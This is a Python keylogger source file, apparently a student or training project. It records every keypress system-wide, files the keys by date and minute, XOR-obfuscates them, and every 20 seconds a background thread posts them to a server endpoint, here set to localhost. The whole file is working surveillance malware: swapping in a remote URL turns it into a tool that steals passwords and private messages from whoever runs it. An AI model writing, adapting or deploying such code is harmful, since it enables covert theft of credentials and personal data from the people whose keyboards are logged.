import keyboard, requests, threading, time                       #Import a library that records keyboard keystrokes.
from datetime import datetime            #Import a library that records date and time.
from Xor_2 import xor_on_key


my_json = []

dicti = {}                                          #A dictionary for saving input from the keyboard.
# my_json = {}
str_for_show = ''

filename = r"C:\my_python\kodcod1\saveData.json"

url = f"http://127.0.0.1:5000/save_data"


def send_data_to_server():
    status = requests.post(url, json=my_json)
    return status

def time_stoper(timeout, func):
    def wrapper():
        global my_json
        while True:
            func()
            my_json = []
            time.sleep(timeout)
    t = threading.Thread(target=wrapper, daemon=True)
    t.start()

def replace_char(char):
    if char == "backspace" or char == "space":
        char = " "
    if char == "enter":
        char = "\n"
    if char == "tab":
        char = "\t"
    if char == "decimal":
        char = "."
    return char


def on_key_press(key):

    """
    A function that receives input from another function (which records the keyboard),
    and inserts it into a dictionary entry whose key is the current date and time.
    """

    key = replace_char(key.name)

    year = datetime.now().strftime('%y')
    month = datetime.now().strftime('%m')
    day = datetime.now().strftime('%d')
    minute = datetime.now().strftime('%H:%M')

    if not my_json:
        my_json.append({})

    if year not in my_json[0]:
        my_json[0][year] = {}
    
    if month not in my_json[0][year]:
        my_json[0][year][month] = {}
    
    if day not in my_json[0][year][month]:
        my_json[0][year][month][day] = {}
    
    if minute not in my_json[0][year][month][day]:
        my_json[0][year][month][day][minute] = ''


    my_json[0][year][month][day][minute] += xor_on_key(key, 7)


#For checking the current file.
if __name__ == "__main__":
    my_file = open(filename, "w")
    my_file.write("")
    keyboard.on_press(on_key_press)               #function call.
    print("program start")
    time_stoper(20, send_data_to_server)
    keyboard.wait('Ctrl + Shift + .')           #Calling a function that terminates the program.